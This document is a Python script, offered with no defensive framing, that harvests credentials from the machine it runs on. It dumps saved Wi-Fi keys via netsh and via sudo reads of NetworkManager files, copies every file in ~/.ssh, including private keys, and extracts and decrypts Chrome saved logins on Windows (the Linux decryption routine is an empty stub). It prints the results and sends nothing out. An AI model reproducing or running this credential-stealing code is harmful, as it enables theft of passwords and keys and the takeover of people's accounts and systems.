import os
import subprocess
import sqlite3

def harvest_credentials():
    credentials = []

    if os.name == 'nt':
        # Windows Wi-Fi password harvesting
        command = "netsh wlan show profiles"
        profiles = os.popen(command).read()
        for profile in profiles.split('\n'):
            if "All User Profile" in profile:
                profile_name = profile.split(":")[1].strip()
                command = f"netsh wlan show profile name=\"{profile_name}\" key=clear"
                result = os.popen(command).read()
                credentials.append(result)
        
        # Windows browser password harvesting (example for Chrome)
        try:
            import win32crypt

            # Path to Chrome's login data
            login_data_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data")
            conn = sqlite3.connect(login_data_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():
                url, username, encrypted_password = row
                password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                credentials.append(f"URL: {url}, Username: {username}, Password: {password}")
        except Exception as e:
            credentials.append(f"Failed to extract browser passwords: {e}")

    elif os.name == 'posix':
        # Linux/MacOS Wi-Fi password harvesting
        command = "sudo cat /etc/NetworkManager/system-connections/*"
        try:
            result = subprocess.check_output(command, shell=True).decode()
            credentials.append(result)
        except subprocess.CalledProcessError as e:
            credentials.append(f"Failed to extract Wi-Fi passwords: {e}")

        # Extract SSH keys
        ssh_keys_path = os.path.expanduser("~/.ssh")
        if os.path.exists(ssh_keys_path):
            for file in os.listdir(ssh_keys_path):
                with open(os.path.join(ssh_keys_path, file), 'r') as f:
                    credentials.append(f.read())
    
        # Linux/MacOS browser password harvesting (example for Chrome)
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            import json

            # Path to Chrome's login data
            login_data_path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
            conn = sqlite3.connect(login_data_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():
                url, username, encrypted_password = row
                # Decryption logic for Linux/MacOS
                password = decrypt_linux_password(encrypted_password)
                credentials.append(f"URL: {url}, Username: {username}, Password: {password}")
        except Exception as e:
            credentials.append(f"Failed to extract browser passwords: {e}")

    return credentials

def decrypt_linux_password(encrypted_password):
    # Implementation of decryption logic for Linux/MacOS Chrome passwords
    pass  # Add the decryption logic here

if __name__ == "__main__":
    creds = harvest_credentials()
    for cred in creds:
        print(cred)
